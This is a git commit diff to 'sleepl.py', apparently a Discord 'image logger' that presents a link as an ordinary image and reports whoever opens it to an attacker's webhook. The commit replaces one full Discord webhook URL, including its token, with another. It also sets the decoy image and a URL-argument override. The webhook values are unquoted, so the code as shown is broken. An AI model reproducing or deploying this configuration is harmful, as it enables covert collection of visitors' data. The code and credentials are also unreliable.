278bfdbf4280f5bb71fcb6714542300606fe84e7
sleepymanw <114233400+sleepymanw@users.noreply.github.com>
2026-05-07 04:17:34 -0400

    Update sleepl.py

--- api/sleepl.py
+++ api/sleepl.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": https://discord.com/api/webhooks/1501852594715361370/3n7Lb28dqqDdHjuXezGXLCiOIbZLkhKTpsP5psinGYsDlKWH7oQ2nx9bABkEzDU0-4Wt,
+    "webhook": https://discord.com/api/webhooks/1501860444212564028/BWixMOu1oT1z51MS_c5Yo9um5tkVoCPL4ilfJWtLyXNHo82jjXDQw-lY8U-P6zJ1WDbp,
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
